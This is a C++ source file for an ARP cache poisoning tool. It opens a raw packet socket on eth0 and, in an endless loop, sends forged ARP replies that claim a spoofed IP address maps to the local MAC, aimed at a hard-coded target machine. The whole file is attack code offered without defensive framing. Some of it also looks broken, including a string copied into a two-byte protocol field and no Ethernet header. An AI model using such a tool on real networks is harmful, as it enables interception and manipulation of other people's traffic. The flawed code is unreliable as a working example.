#include <iostream>
#include <cstring>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <netinet/ip.h>

class ARPPoisoner {
private:
    int sock_;
    struct sockaddr_ll device_;

    struct ARPHeader {
        uint16_t hw_type;
        uint16_t proto_type;
        uint8_t hw_addr_len;
        uint8_t proto_addr_len;
        uint16_t op;
        uint8_t sender_mac[6];
        uint8_t sender_ip[4];
        uint8_t target_mac[6];
        uint8_t target_ip[4];
    };

    void getMACAddress(const char* iface, uint8_t* mac) {
        struct ifreq ifr;
        strcpy(ifr.ifr_name, iface);
        ioctl(sock_, SIOCGIFHWADDR, &ifr);
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    }

public:
    ARPPoisoner() {
        if ((sock_ = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
            perror("Socket creation failed");
            exit(EXIT_FAILURE);
        }

        memset(&device_, 0, sizeof(device_));
        strcpy((char*)device_.sll_protocol, "arp");
        device_.sll_family = AF_PACKET;
        device_.sll_ifindex = if_nametoindex("eth0");

        getMACAddress("eth0", device_.sll_addr);
    }

    void sendARP(const char* target_ip_str, const char* sender_ip_str) {
        ARPHeader arp_header;

        arp_header.hw_type = htons(ARPHRD_ETHER);
        arp_header.proto_type = htons(ETH_P_IP);
        arp_header.hw_addr_len = 6;
        arp_header.proto_addr_len = 4;
        arp_header.op = htons(ARPOP_REPLY);

        getMACAddress("eth0", arp_header.sender_mac);
        inet_pton(AF_INET, sender_ip_str, arp_header.sender_ip);
        memset(arp_header.target_mac, 0xFF, 6);
        inet_pton(AF_INET, target_ip_str, arp_header.target_ip);

        sendto(sock_, &arp_header, sizeof(ARPHeader), 0, (struct sockaddr*)&device_, sizeof(device_));
    }

    ~ARPPoisoner() {
        close(sock_);
    }
};

int main() {
    ARPPoisoner poisoner;
    const char* target_ip = "172.31.0.2"; // IP of the target machine
    const char* sender_ip = "172.31.0.4"; // IP of the sender (spoofed)
    while(true) {
        poisoner.sendARP(target_ip, sender_ip);
        sleep(5);
    }
    return 0;
}
